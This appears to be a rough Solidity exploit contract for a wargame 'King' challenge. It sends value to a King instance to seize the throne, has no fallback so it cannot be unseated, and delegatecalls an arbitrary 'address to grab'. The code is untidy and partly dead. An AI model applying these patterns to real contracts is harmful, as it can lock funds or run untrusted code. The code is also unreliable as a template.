// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./king.sol";
import "hardhat/console.sol";

contract Kin {
    string public something = "hahaha";

    function validateTest(address payable _ethtar /*address to grab*/) external {

      // Grab Greeter
      (bool lol,) = address(_ethtar).delegatecall(abi.encodeWithSignature("lemmeknow()")/* keccak of lemme */);
      console.log("The address that was passede t o delegate is: %s", lol);
       // .Call with value 0
      //  (bool result,) = address(_tar).call{value:0}("");
      //  !result;
    }

    function darkSubmit(address payable _instance) public {
      // tEST .CALL consequnce
      (bool result,) = address(_instance).call{value:0}("");
      console.log("dark result : %s", result);
    }

    function vcard(address payable _instance, address _player) public returns (bool) {
        _player;
        King instance = King(_instance);
        (bool result,) = address(instance).call{value:20}("");
        console.log("dark result : %s", result);
        !result;
        return instance._king() != address(this);
  }
}